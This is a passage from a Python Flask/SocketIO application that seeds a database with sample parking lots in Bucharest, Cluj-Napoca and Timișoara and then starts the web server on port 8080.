                ParkingLot(name='Parking Unirii', address='Piața Unirii 3', city='București',
                           total_spots=100, available_spots=72, price_per_hour=4.0, is_active=True,
                           description='Aproape de metrou și mall'),
                ParkingLot(name='ParkSide Nord', address='Bulevardul Aviatorilor 45', city='București',
                           total_spots=30, available_spots=15, price_per_hour=6.0, is_active=True,
                           description='Parcare premium în zona de nord'),
                ParkingLot(name='Parking Victoriei', address='Calea Victoriei 88', city='București',
                           total_spots=60, available_spots=42, price_per_hour=4.5, is_active=True,
                           description='Zonă centrală, acces facil'),
                ParkingLot(name='Cluj Parking Central', address='Strada Memorandumului 5', city='Cluj-Napoca',
                           total_spots=40, available_spots=20, price_per_hour=3.5, is_active=True,
                           description='În inima Clujului'),
                ParkingLot(name='Parking Timișoara', address='Piața Victoriei 2', city='Timișoara',
                           total_spots=35, available_spots=28, price_per_hour=3.0, is_active=True,
                           description='Parcare modernă în centru'),
            ]
            db.session.add_all(lots)
        db.session.commit()


if __name__ == '__main__':
    app = create_app()
    seed_data(app)
    socketio.run(app, host='0.0.0.0', debug=False, port=8080, allow_unsafe_werkzeug=True, use_reloader=False)
